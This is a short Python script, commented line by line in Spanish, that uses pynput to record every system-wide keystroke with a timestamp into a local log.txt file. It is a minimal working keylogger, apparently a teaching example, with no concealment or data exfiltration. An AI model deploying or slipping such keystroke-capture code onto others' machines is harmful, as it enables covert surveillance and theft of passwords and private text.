# Importamos Key y Listener del módulo keyboard de pynput
# Key → teclas especiales (esc, enter, etc.)
# Listener → escucha todas las teclas pulsadas en el sistema
from pynput.keyboard import Key, Listener

# Importamos logging para guardar los eventos en un fichero
import logging

# Configuramos el sistema de logging
# filename → fichero donde se guardan las teclas
# level → registra todo desde DEBUG hacia arriba
# format → cada línea muestra: fecha/hora - tecla pulsada
logging.basicConfig(filename="log.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

# Función que se ejecuta cada vez que se pulsa una tecla
# key → la tecla pulsada que recibe automáticamente Listener
def presionar(key):
    logging.info(str(key))  # Guarda la tecla en el fichero como texto

# Iniciamos el Listener y le decimos que use nuestra función presionar
# with → gestiona el inicio y cierre del listener automáticamente
# listener.join() → mantiene el programa vivo esperando teclas
with Listener(on_press=presionar) as listener:
    listener.join()